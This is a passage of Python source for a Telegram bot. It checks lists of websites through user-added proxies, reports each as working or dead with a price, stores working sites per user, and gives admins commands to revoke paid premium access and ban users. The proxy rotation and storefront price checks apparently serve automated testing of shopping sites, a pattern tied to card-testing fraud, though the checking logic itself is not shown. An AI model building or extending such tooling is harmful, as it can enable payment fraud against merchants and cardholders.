        return await event.reply("⚠️ 𝙋𝙧𝙤𝙭𝙮 𝙍𝙚𝙦𝙪𝙞𝙧𝙚𝙙!\n\n𝙋𝙡𝙚𝙖𝙨𝙚 𝙖𝙙𝙙 𝙖 𝙥𝙧𝙤𝙭𝙮 𝙛𝙞𝙧𝙨𝙩 𝙪𝙨𝙞𝙣𝙜:\n`/addpxy ip:port:username:password`\n\n𝙊𝙧 𝙬𝙞𝙩𝙝𝙤𝙪𝙩 𝙖𝙪𝙩𝙝:\n`/addpxy ip:port`")
    check_text = event.raw_text[6:].strip()
    if not check_text:
        buttons = [[Button.inline("🔍 𝘾𝙝𝙚𝙘𝙠 𝙈𝙮 𝘿𝘽 𝙎𝙞𝙩𝙚𝙨", b"check_db_sites")]]
        instruction_text = """🔍 **𝙎𝙞𝙩𝙚 𝘾𝙝𝙚𝙘𝙠𝙚𝙧**

𝙄𝙛 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙘𝙝𝙚𝙘𝙠 𝙨𝙞𝙩𝙚𝙨 𝙩𝙝𝙚𝙣 𝙩𝙮𝙥𝙚:

`/check`
`1. https://example.com`
`2. https://site2.com`
`3. https://site3.com`

𝘼𝙣𝙙 𝙞𝙛 𝙮𝙤𝙪 𝙬𝙖𝙣𝙩 𝙩𝙤 𝙘𝙝𝙚𝙘𝙠 𝙮𝙤𝙪𝙧 𝘿𝘽 𝙨𝙞𝙩𝙚𝙨 𝙖𝙣𝙙 𝙖𝙙𝙙 𝙬𝙤𝙧𝙠𝙞𝙣𝙜 & 𝙧𝙚𝙢𝙤𝙫𝙚 𝙣𝙤𝙩 𝙬𝙤𝙧𝙠𝙞𝙣𝙜 𝙨𝙞𝙩𝙚𝙨, 𝙘𝙡𝙞𝙘𝙠 𝙗𝙚𝙡𝙤𝙬 𝙗𝙪𝙩𝙩𝙤𝙣:"""
        return await event.reply(instruction_text, buttons=buttons)
    sites_to_check = extract_urls_from_text(check_text)
    if not sites_to_check:
        return await event.reply("❌ 𝙉𝙤 𝙫𝙖𝙡𝙞𝙙 𝙪𝙧𝙡𝙨/𝙙𝙤𝙢𝙖𝙞𝙣𝙨 𝙛𝙤𝙪𝙣𝙙!\n\n💡 𝙀𝙭𝙖𝙢𝙥𝙡𝙚:\n`/check`\n`1. https://example.com`\n`2. site2.com`")
    total_sites_found = len(sites_to_check)
    if len(sites_to_check) > 10:
        sites_to_check = sites_to_check[:10]
        await event.reply(f"```⚠️ 𝙁𝙤𝙪𝙣𝙙 {total_sites_found} 𝙨𝙞𝙩𝙚𝙨, 𝙘𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙤𝙣𝙡𝙮 𝙛𝙞𝙧𝙨𝙩 10 𝙨𝙞𝙩𝙚𝙨```")
    asyncio.create_task(process_site_check(event, sites_to_check))

async def process_site_check(event, sites):
    total_sites = len(sites)
    checked = 0
    working_sites = []
    dead_sites = []
    status_msg = await event.reply(f"```🔍 𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 {total_sites} 𝙨𝙞𝙩𝙚𝙨...```")
    sem = get_semaphore(event.sender_id, 'site', SITE_PER_USER_WORKERS)
    batch_size = SITE_CHECK_BATCH
    proxy_dead_occurred = False
    user_id = event.sender_id

    for i in range(0, len(sites), batch_size):
        batch = sites[i:i+batch_size]
        tasks = []
        for site in batch:
            tasks.append(
                asyncio.create_task(
                    _run_with_semaphore(sem, test_single_site, site, user_id=user_id)
                )
            )
        results = await asyncio.gather(*tasks, return_exceptions=True)
        for j, (site, result) in enumerate(zip(batch, results)):
            checked += 1
            if isinstance(result, Exception):
                result = {"status": "dead", "response": f"Exception: {str(result)}", "site": site, "price": "-"}
            
            # Handle proxy dead gracefully: remove proxy and continue
            if result["status"] == "proxy_dead":
                proxy_dead_occurred = True
                dead_sites.append({"site": site, "price": "-"})
                await update_site_check_status(status_msg, checked, total_sites, working_sites, dead_sites, site, "proxy_dead")
                continue  # Continue with next site, don't stop

            if result["status"] == "working":
                working_sites.append({"site": site, "price": result["price"]})
            else:
                dead_sites.append({"site": site, "price": result["price"]})
            
            await update_site_check_status(status_msg, checked, total_sites, working_sites, dead_sites, site, result["status"])

    # Final summary
    final_text = f"""✅ **𝙎𝙞𝙩𝙚 𝘾𝙝𝙚𝙘𝙠 𝘾𝙤𝙢𝙥𝙡𝙚𝙩𝙚!**

📊 **𝙍𝙚𝙨𝙪𝙡𝙩𝙨:**
🟢 𝙒𝙤𝙧𝙠𝙞𝙣𝙜 𝙎𝙞𝙩𝙚𝙨: {len(working_sites)}
🔴 𝘿𝙚𝙖𝙙 𝙎𝙞𝙩𝙚𝙨: {len(dead_sites)}
"""
    if proxy_dead_occurred:
        final_text += "\n⚠️ **Some proxies died during check. They have been removed automatically.**\n"
        final_text += "ℹ️ Add new proxies with `/addpxy` or continue with remaining proxies.\n"
    
    if working_sites:
        final_text += "\n✅ **𝙒𝙤𝙧𝙠𝙞𝙣𝙜 𝙎𝙞𝙩𝙚𝙨:**\n"
        for idx, site_data in enumerate(working_sites, 1):
            final_text += f"{idx}. `{site_data['site']}` - {site_data['price']}\n"
        final_text += "\n"
    if dead_sites:
        final_text += "❌ **𝘿𝙚𝙖𝙙 𝙎𝙞𝙩𝙚𝙨:**\n"
        for idx, site_data in enumerate(dead_sites, 1):
            final_text += f"{idx}. `{site_data['site']}` - {site_data['price']}\n"
        final_text += "\n"
    buttons = []
    if working_sites:
        TEMP_WORKING_SITES[event.sender_id] = [site_data['site'] for site_data in working_sites]
        buttons.append([Button.inline("➕ 𝘼𝙙𝙙 𝙒𝙤𝙧𝙠𝙞𝙣𝙜 𝙎𝙞𝙩𝙚𝙨 𝙩𝙤 𝘿𝘽", f"add_working:{event.sender_id}".encode())])
    try:
        await status_msg.edit(final_text, buttons=buttons)
    except:
        await event.reply(final_text, buttons=buttons)

async def update_site_check_status(status_msg, checked, total_sites, working_sites, dead_sites, current_site, status):
    working_count = len(working_sites)
    dead_count = len(dead_sites)
    status_text = f"""```🔍 𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙎𝙞𝙩𝙚𝙨...

📊 𝙋𝙧𝙤𝙜𝙧𝙚𝙨𝙨: [{checked}/{total_sites}]
✅ 𝙒𝙤𝙧𝙠𝙞𝙣𝙜: {working_count}
❌ 𝘿𝙚𝙖𝙙: {dead_count}

🔄 𝘾𝙪𝙧𝙧𝙚𝙣𝙩: {current_site}
📝 𝙎𝙩𝙖𝙩𝙪𝙨: {status.upper()}```"""
    try:
        await status_msg.edit(status_text)
    except:
        pass

@client.on(events.CallbackQuery(data=b"check_db_sites"))
async def check_db_sites_callback(event):
    user_id = event.sender_id
    sites = await load_json(SITE_FILE)
    user_sites = sites.get(str(user_id), [])
    if not user_sites:
        return await event.answer("❌ 𝙔𝙤𝙪 𝙝𝙖𝙫𝙚𝙣'𝙩 𝙖𝙙𝙙𝙚𝙙 𝙖𝙣𝙮 𝙨𝙞𝙩𝙚𝙨 𝙮𝙚𝙩!", alert=True)
    await event.answer("🔍 𝙎𝙩𝙖𝙧𝙩𝙞𝙣𝙜 𝘿𝘽 𝙨𝙞𝙩𝙚 𝙘𝙝𝙚𝙘𝙠...", alert=False)
    asyncio.create_task(process_db_site_check(event, user_sites))

async def process_db_site_check(event, user_sites):
    user_id = event.sender_id
    total_sites = len(user_sites)
    checked = 0
    working_sites = []
    dead_sites = []
    status_text = f"```🔍 𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙔𝙤𝙪𝙧 {total_sites} 𝘿𝘽 𝙨𝙞𝙩𝙚𝙨...```"
    await event.edit(status_text)
    sem = get_semaphore(user_id, 'site', SITE_PER_USER_WORKERS)
    batch_size = SITE_CHECK_BATCH
    proxy_dead_occurred = False

    for i in range(0, len(user_sites), batch_size):
        batch = user_sites[i:i+batch_size]
        tasks = []
        for site in batch:
            tasks.append(
                asyncio.create_task(
                    _run_with_semaphore(sem, test_single_site, site, user_id=user_id)
                )
            )
        results = await asyncio.gather(*tasks, return_exceptions=True)
        for j, (site, result) in enumerate(zip(batch, results)):
            checked += 1
            if isinstance(result, Exception):
                result = {"status": "dead", "response": f"Exception: {str(result)}", "site": site, "price": "-"}
            
            if result["status"] == "proxy_dead":
                proxy_dead_occurred = True
                dead_sites.append(site)
                await update_db_site_check_status(event, checked, total_sites, working_sites, dead_sites, site, "proxy_dead")
                continue

            if result["status"] == "working":
                working_sites.append(site)
            else:
                dead_sites.append(site)
            await update_db_site_check_status(event, checked, total_sites, working_sites, dead_sites, site, result["status"])

    if dead_sites:
        sites_data = await load_json(SITE_FILE)
        sites_data[str(user_id)] = working_sites
        await save_json(SITE_FILE, sites_data)

    final_text = f"""✅ **𝘿𝘽 𝙎𝙞𝙩𝙚 𝘾𝙝𝙚𝙘𝙠 𝘾𝙤𝙢𝙥𝙡𝙚𝙩𝙚!**

📊 **𝙍𝙚𝙨𝙪𝙡𝙩𝙨:**
🟢 𝙒𝙤𝙧𝙠𝙞𝙣𝙜 𝙎𝙞𝙩𝙚𝙨: {len(working_sites)}
🔴 𝘿𝙚𝙖𝙙 𝙎𝙞𝙩𝙚𝙨 (𝙍𝙚𝙢𝙤𝙫𝙚𝙙): {len(dead_sites)}
"""
    if proxy_dead_occurred:
        final_text += "\n⚠️ **Some proxies died during check. They have been removed automatically.**\n"
    
    if working_sites:
        final_text += "\n✅ **𝙒𝙤𝙧𝙠𝙞𝙣𝙜 𝙎𝙞𝙩𝙚𝙨:**\n"
        for idx, site in enumerate(working_sites, 1):
            final_text += f"{idx}. `{site}`\n"
        final_text += "\n"
    if dead_sites:
        final_text += "❌ **𝘿𝙚𝙖𝙙 𝙎𝙞𝙩𝙚𝙨 (𝙍𝙚𝙢𝙤𝙫𝙚𝙙):**\n"
        for idx, site in enumerate(dead_sites, 1):
            final_text += f"{idx}. `{site}`\n"
    try:
        await event.edit(final_text)
    except:
        pass

async def update_db_site_check_status(event, checked, total_sites, working_sites, dead_sites, current_site, status):
    working_count = len(working_sites)
    dead_count = len(dead_sites)
    status_text = f"""```🔍 𝘾𝙝𝙚𝙘𝙠𝙞𝙣𝙜 𝙔𝙤𝙪𝙧 𝘿𝘽 𝙎𝙞𝙩𝙚𝙨...

📊 𝙋𝙧𝙤𝙜𝙧𝙚𝙨𝙨: [{checked}/{total_sites}]
✅ 𝙒𝙤𝙧𝙠𝙞𝙣𝙜: {working_count}
❌ 𝘿𝙚𝙖𝙙: {dead_count}

🔄 𝘾𝙪𝙧𝙧𝙚𝙣𝙩: {current_site}
📝 𝙎𝙩𝙖𝙩𝙪𝙨: {status.upper()}```"""
    try:
        await event.edit(status_text)
    except:
        pass

@client.on(events.CallbackQuery(pattern=rb"add_working:(\d+)"))
async def add_working_sites_callback(event):
    try:
        match = event.pattern_match
        callback_user_id = int(match.group(1).decode())
        if event.sender_id != callback_user_id:
            return await event.answer("❌ 𝙔𝙤𝙪 𝙘𝙖𝙣 𝙤𝙣𝙡𝙮 𝙖𝙙𝙙 𝙨𝙞𝙩𝙚𝙨 𝙛𝙧𝙤𝙢 𝙮𝙤𝙪𝙧 𝙤𝙬𝙣 𝙘𝙝𝙚𝙘𝙠!", alert=True)
        working_sites = TEMP_WORKING_SITES.get(callback_user_id, [])
        if not working_sites:
            return await event.answer("❌ 𝙉𝙤 𝙬𝙤𝙧𝙠𝙞𝙣𝙜 𝙨𝙞𝙩𝙚𝙨 𝙛𝙤𝙪𝙣𝙙! 𝙋𝙡𝙚𝙖𝙨𝙚 𝙧𝙪𝙣 /𝙘𝙝𝙚𝙘𝙠 𝙖𝙜𝙖𝙞𝙣.", alert=True)
        sites_data = await load_json(SITE_FILE)
        user_sites = sites_data.get(str(callback_user_id), [])
        added_sites = []
        already_exists = []
        for site in working_sites:
            if site not in user_sites:
                user_sites.append(site)
                added_sites.append(site)
            else:
                already_exists.append(site)
        sites_data[str(callback_user_id)] = user_sites
        await save_json(SITE_FILE, sites_data)
        TEMP_WORKING_SITES.pop(callback_user_id, None)
        response_parts = []
        if added_sites:
            added_text = f"✅ **𝘼𝙙𝙙𝙚𝙙 {len(added_sites)} 𝙉𝙚𝙬 𝙎𝙞𝙩𝙚𝙨:**\n"
            for site in added_sites:
                added_text += f"• `{site}`\n"
            response_parts.append(added_text)
        if already_exists:
            exists_text = f"⚠️ **{len(already_exists)} 𝙎𝙞𝙩𝙚𝙨 𝘼𝙡𝙧𝙚𝙖𝙙𝙮 𝙀𝙭𝙞𝙨𝙩:**\n"
            for site in already_exists:
                exists_text += f"• `{site}`\n"
            response_parts.append(exists_text)
        if response_parts:
            response_text = "\n".join(response_parts)
            response_text += f"\n📊 **𝙏𝙤𝙩𝙖𝙡 𝙎𝙞𝙩𝙚𝙨 𝙞𝙣 𝙔𝙤𝙪𝙧 𝘿𝘽:** {len(user_sites)}"
        else:
            response_text = "ℹ️ 𝘼𝙡𝙡 𝙨𝙞𝙩𝙚𝙨 𝙖𝙧𝙚 𝙖𝙡𝙧𝙚𝙖𝙙𝙮 𝙞𝙣 𝙮𝙤𝙪𝙧 𝘿𝘽!"
        await event.answer("✅ 𝙎𝙞𝙩𝙚𝙨 𝙥𝙧𝙤𝙘𝙚𝙨𝙨𝙚𝙙!", alert=False)
        current_text = event.message.text
        updated_text = current_text + f"\n\n🔄 **𝙐𝙥𝙙𝙖𝙩𝙚:**\n{response_text}"
        try:
            await event.edit(updated_text, buttons=None)
        except:
            await event.respond(response_text)
    except Exception as e:
        await event.answer(f"❌ 𝙀𝙧𝙧𝙤𝙧: {str(e)}", alert=True)

# ── Admin: Remove Premium ──

@client.on(events.NewMessage(pattern='/unauth'))
async def unauth_user(event):
    if event.sender_id not in ADMIN_ID:
        return await event.reply("🚫 𝙊𝙣𝙡𝙮 𝘼𝙙𝙢𝙞𝙣 𝘾𝙖𝙣 𝙐𝙨𝙚 𝙏𝙝𝙞𝙨 𝘾𝙤𝙢𝙢𝙖𝙣𝙙!")
    try:
        parts = event.raw_text.split()
        if len(parts) != 2:
            return await event.reply("𝙁𝙤𝙧𝙢𝙖𝙩: /unauth {user_id}")
        user_id = int(parts[1])
        if not await is_premium_user(user_id):
            return await event.reply(f"❌ 𝙐𝙨𝙚𝙧 {user_id} 𝙙𝙤𝙚𝙨 𝙣𝙤𝙩 𝙝𝙖𝙫𝙚 𝙥𝙧𝙚𝙢𝙞𝙪𝙢 𝙖𝙘𝙘𝙚𝙨𝙨!")
        success = await remove_premium_user(user_id)
        if success:
            await event.reply(f"✅ 𝙋𝙧𝙚𝙢𝙞𝙪𝙢 𝙖𝙘𝙘𝙚𝙨𝙨 𝙧𝙚𝙢𝙤𝙫𝙚𝙙 𝙛𝙤𝙧 𝙪𝙨𝙚𝙧 {user_id}!")
            try:
                await client.send_message(user_id, f"⚠️ 𝙔𝙤𝙪𝙧 𝙋𝙧𝙚𝙢𝙞𝙪𝙢 𝘼𝙘𝙘𝙚𝙨𝙨 𝙃𝙖𝙨 𝘽𝙚𝙚𝙣 𝙍𝙚𝙫𝙤𝙠𝙚𝙙!\n\n𝙔𝙤𝙪 𝙘𝙖𝙣 𝙣𝙤 𝙡𝙤𝙣𝙜𝙚𝙧 𝙪𝙨𝙚 𝙩𝙝𝙚 𝙗𝙤𝙩 𝙞𝙣 𝙥𝙧𝙞𝙫𝙖𝙩𝙚 𝙘𝙝𝙖𝙩.\n\n𝙁𝙤𝙧 𝙞𝙣𝙦𝙪𝙞𝙧𝙞𝙚𝙨, 𝙘𝙤𝙣𝙩𝙖𝙘𝙩 @𝙈𝙤𝙙_𝘽𝙮_𝙆𝙖𝙢𝙖𝙡")
            except:
                pass
        else:
            await event.reply(f"❌ 𝙁𝙖𝙞𝙡𝙚𝙙 𝙩𝙤 𝙧𝙚𝙢𝙤𝙫𝙚 𝙖𝙘𝙘𝙚𝙨𝙨 𝙛𝙤𝙧 𝙪𝙨𝙚𝙧 {user_id}")
    except ValueError:
        await event.reply("❌ 𝙄𝙣𝙫𝙖𝙡𝙞𝙙 𝙪𝙨𝙚𝙧 𝙄𝘿!")
    except Exception as e:
        await event.reply(f"❌ 𝙀𝙧𝙧𝙤𝙧: {e}")

# ── Admin: Ban / Unban ──

@client.on(events.NewMessage(pattern='/ban'))
async def ban_user_command(event):
    if event.sender_id not in ADMIN_ID:
        return await event.reply("🚫 𝙊𝙣𝙡𝙮 𝘼𝙙𝙢𝙞𝙣 𝘾𝙖𝙣 𝙐𝙨𝙚 𝙏𝙝𝙞𝙨 𝘾𝙤𝙢𝙢𝙖𝙣𝙙!")
    try:
        parts = event.raw_text.split()
        if len(parts) != 2:
            return await event.reply("𝙁𝙤𝙧𝙢𝙖𝙩: /ban {user_id}")
        user_id = int(parts[1])
        if await is_banned_user(user_id):
            return await event.reply(f"❌ 𝙐𝙨𝙚𝙧 {user_id} 𝙞𝙨 𝙖𝙡𝙧𝙚𝙖𝙙𝙮 𝙗𝙖𝙣𝙣𝙚𝙙!")
        await remove_premium_user(user_id)
        await ban_user(user_id, event.sender_id)
        await event.reply(f"✅ 𝙐𝙨𝙚𝙧 {user_id} 𝙝𝙖𝙨 𝙗𝙚𝙚𝙣 𝙗𝙖𝙣𝙣𝙚𝙙!")
        try:
            await client.send_message(user_id, f"🚫 𝙔𝙤𝙪 𝙃𝙖𝙫𝙚 𝘽𝙚𝙚𝙣 𝘽𝙖𝙣𝙣𝙚𝙙!\n\n𝙔𝙤𝙪 𝙖𝙧𝙚 𝙣𝙤 𝙡𝙤𝙣𝙜𝙚𝙧 𝙖𝙗𝙡𝙚 𝙩𝙤 𝙪𝙨𝙚 𝙩𝙝𝙞𝙨 𝙗𝙤𝙩 𝙞𝙣 𝙥𝙧𝙞𝙫𝙖𝙩𝙚 𝙤𝙧 𝙜𝙧𝙤𝙪𝙥 𝙘𝙝𝙖𝙩.\n\n𝙁𝙤𝙧 𝙖𝙥𝙥𝙚𝙖𝙡, 𝙘𝙤𝙣𝙩𝙖𝙘𝙩 @𝙈𝙤𝙙_𝘽𝙮_𝙆𝙖𝙢𝙖𝙡")
        except:
            pass
    except ValueError:
        await event.reply("❌ 𝙄𝙣𝙫𝙖𝙡𝙞𝙙 𝙪𝙨𝙚𝙧 𝙄𝘿!")
    except Exception as e:
        await event.reply(f"❌ 𝙀𝙧𝙧𝙤𝙧: {e}")

@client.on(events.NewMessage(pattern='/unban'))
async def unban_user_command(event):
    if event.sender_id not in ADMIN_ID:
        return await event.reply("🚫 𝙊𝙣𝙡𝙮 𝘼𝙙𝙢𝙞𝙣 𝘾𝙖𝙣 𝙐𝙨𝙚 𝙏𝙝𝙞𝙨 𝘾𝙤𝙢𝙢𝙖𝙣𝙙!")
    try:
        parts = event.raw_text.split()
        if len(parts) != 2:
            return await event.reply("𝙁𝙤𝙧𝙢𝙖𝙩: /unban {user_id}")
        user_id = int(parts[1])
        if not await is_banned_user(user_id):
            return await event.reply(f"❌ 𝙐𝙨𝙚𝙧 {user_id} 𝙞𝙨 𝙣𝙤𝙩 𝙗𝙖𝙣𝙣𝙚𝙙!")
        success = await unban_user(user_id)
        if success:
            await event.reply(f"✅ 𝙐𝙨𝙚𝙧 {user_id} 𝙝𝙖𝙨 𝙗𝙚𝙚𝙣 𝙪𝙣𝙗𝙖𝙣𝙣𝙚𝙙!")
            try:
                await client.send_message(user_id, f"🎉 𝙔𝙤𝙪 𝙃𝙖𝙫𝙚 𝘽𝙚𝙚𝙣 𝙐𝙣𝙗𝙖𝙣𝙣𝙚𝙙!\n\n𝙔𝙤𝙪 𝙘𝙖𝙣 𝙣𝙤𝙬 𝙪𝙨𝙚 𝙩𝙝𝙞𝙨 𝙗𝙤𝙩 𝙖𝙜𝙖𝙞𝙣 𝙞𝙣 𝙜𝙧𝙤𝙪𝙥𝙨.\n\n𝙁𝙤𝙧 𝙥𝙧𝙞𝙫𝙖𝙩𝙚 𝙖𝙘𝙘𝙚𝙨𝙨, 𝙮𝙤𝙪 𝙬𝙞𝙡𝙡 𝙣𝙚𝙚𝙙 𝙩𝙤 𝙥𝙪𝙧𝙘𝙝𝙖𝙨𝙚 𝙖 𝙣𝙚𝙬 𝙠𝙚𝙮.")
            except:
                pass
        else:
            await event.reply(f"❌ 𝙁𝙖𝙞𝙡𝙚𝙙 𝙩𝙤 𝙪𝙣𝙗𝙖𝙣 𝙪𝙨𝙚𝙧 {user_id}")
    except ValueError:
        await event.reply("❌ 𝙄𝙣𝙫𝙖𝙡𝙞𝙙 𝙪𝙨𝙚𝙧 𝙄𝘿!")
    except Exception as e:
        await event.reply(f"❌ 𝙀𝙧𝙧𝙤𝙧: {e}")

# ── Helper: run async function with semaphore ──

async def _run_with_semaphore(sem, func, *args, **kwargs):
    async with sem:
        return await func(*args, **kwargs)

# ────────────────────────────────────────────────────────────────
#  MAIN
# ────────────────────────────────────────────────────────────────

async def main():
    global _http_session
    # Create shared aiohttp session with connection pooling
    conn = aiohttp.TCPConnector(limit=200, limit_per_host=100, ttl_dns_cache=300)
    _http_session = aiohttp.ClientSession(connector=conn)
    await initialize_files()
    print("𝘽𝙊𝙏 𝙍𝙐𝙉𝙉𝙄𝙉𝙂 💨")
    await client.start(bot_token=BOT_TOKEN)
    try:
        await client.run_until_disconnected()
    finally:
        await _http_session.close()

if __name__ == "__main__":
    asyncio.run(main())
 
